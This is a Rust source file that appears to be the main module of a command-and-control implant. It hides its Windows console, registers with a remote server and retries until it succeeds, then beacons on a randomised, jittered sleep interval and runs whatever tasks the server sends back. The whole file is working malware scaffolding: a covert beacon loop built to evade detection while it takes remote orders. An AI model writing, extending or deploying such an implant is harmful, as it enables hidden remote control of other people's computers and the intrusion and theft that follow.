#![windows_subsystem = "windows"]

mod config {
    include!(concat!(env!("OUT_DIR"), "/config.rs"));
}
mod crypto;
mod transport;
mod commands;

use std::thread;
use std::time::Duration;
use commands::{DYN_SLEEP_SEC, DYN_JITTER_PCT};

fn sleep_ms() -> u64 {
    use std::sync::atomic::Ordering;
    let base = {
        let s = DYN_SLEEP_SEC.load(Ordering::Relaxed);
        if s == u64::MAX { config::SLEEP_SEC } else { s }
    } * 1000;
    let pct = {
        let j = DYN_JITTER_PCT.load(Ordering::Relaxed);
        if j == u64::MAX { config::JITTER_PCT } else { j }
    };
    if pct == 0 { return base; }
    let jit = (base * pct / 100) as i64;
    let mut r = [0u8; 8];
    crypto::random_bytes(&mut r);
    let delta = (i64::from_le_bytes(r).abs() % (jit * 2 + 1)) - jit;
    (base as i64 + delta).max(1000) as u64
}

fn main() {
    let mut t = transport::AgentTransport::new();

    // Registration loop — retry every 30 s until success
    loop {
        if t.register() { break; }
        thread::sleep(Duration::from_secs(30));
    }

    // Beacon loop
    loop {
        let tasks = t.beacon();
        for task in tasks {
            commands::dispatch(&mut t, &task);
        }
        thread::sleep(Duration::from_millis(sleep_ms()));
    }
}
